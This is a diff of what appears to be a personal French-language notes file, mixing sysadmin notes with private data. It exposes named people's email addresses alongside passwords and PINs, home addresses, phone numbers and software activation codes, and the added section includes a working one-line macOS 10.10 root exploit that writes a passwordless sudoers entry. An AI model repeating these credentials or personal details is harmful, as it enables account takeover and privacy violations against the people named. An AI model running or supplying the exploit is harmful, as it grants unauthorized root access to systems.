@@ -82,6 +82,9 @@ http://www.progonline.com/mypage.php?quoi=coordonnees_client&nick=baldellon&page
 WaveLab LE 9 activation code: 0240 7CVN NVUM VTSU TTYF EJ00 158F 8F3E
 Cubase  LE 9 activation code: 0240 7CDE CVHZ UMHW WBKC GB00 16C1 8928
 
+UVI
+UVX80
+UVISC58-CEACE57A
 
 
 FreedomBox  Personal Server Web, Email, chat, vpn, image, etc.
@@ -688,7 +691,7 @@ MidiNote -> fichier midi.
 Carole Sagon
 Karim Haddad
 
-** Jean-Pierre Aizier
+** jean-Pierre Aizier
 appleid|jean-pierreaizier@orange.fr|Titiminou88|1146
 jpaizier@gmail.com|Titiminou88|
 jpaizier@yahoo.fr|
@@ -4369,8 +4372,7 @@ Mme Thérèse Chilkowy
 Mme Christiane Chilkowy
 19, Grande Rue
 88340 Le Val d'Ajol
-0785017461 christianeckw@orange.fr
-ct2pj4bf6ag8
+0785017461 christianeckw@orange.fr ct2pj4bf6ag8
 
 
 Mme Bourguignon Joëlle
@@ -11892,7 +11894,58 @@ sudo dseditgroup -o edit -a $USER -t user procmod
 
 #-END(src)
 
-**** port notes:
+*** MacOSX 10.10 root exploit:
+
+#+BEGIN(src)
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s # via reddit: numinit (shorter)
+#+END(src)
+
+*** samba linux -> macosx
+
+The trick is not to give a path to mount, but the name of a "share":
+mount --verbose -t cifs -o pass=${pass},user=pjb,uid=1000,gid=1000,nounix,sec=ntlmssp,noperm,rw '//larissa/Test' /mnt/p
+
+*** larissa
+
+ Remember to set the environment variable GRADLE_HOME to the path to
+ the gradle distribution: /opt/local/share/java/gradle
+
+Apple X11.app:    defaults write org.x.X11 enable_test_extensions -boolean true
+MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true
+
+**** pure-ftpd
+
+========================================================================
+Pure-FTPd documentation is located in: /opt/local/share/doc/pure-ftpd
+
+You can start Pure-FTPd from the command line with:
+    sudo /opt/local/sbin/pure-ftpd &
+A future release of Pure-FTPd will no longer support
+xinetd, and has been removed from this version.  If you are using that
+method to start Pure-FTPd now, please switch to using launchd(8).
+
+A sample launchd plist has been created to get you started.
+    1) org.pure-ftpd.ftpd.plist.basic.sample
+        Basic but secure chrooted ftp server
+
+To install the launchd item, issue the following commands:
+cd /opt/local/share/doc/pure-ftpd/
+sudo cp org.pure-ftpd.ftpd.plist.basic.sample /Library/LaunchDaemons/org.pure-ftpd.ftpd.plist
+  - and then load the launchd item -
+sudo launchctl load -w /Library/LaunchDaemons/org.pure-ftpd.ftpd.plist
+
+If you intend to use pure-FTPd with PAM, meaning you want to authenticate against Mac OS X
+user accounts, please copy the pure-ftpd.pam.10.x.sample file to /etc/pam.d/pure-ftpd
+cd /opt/local/share/doc/pure-ftpd/
+sudo cp pure-ftpd.pam.10.x.sample /etc/pam.d/pure-ftpd
+You can now test the server with:
+    ftp localhost
+You should see a Welcome to Pure-FTPd message.
+
+See https://www.pureftpd.org/ for more information.
+========================================================================
+
+*** port
 
 #+BEGIN(src)
 ##########################################################
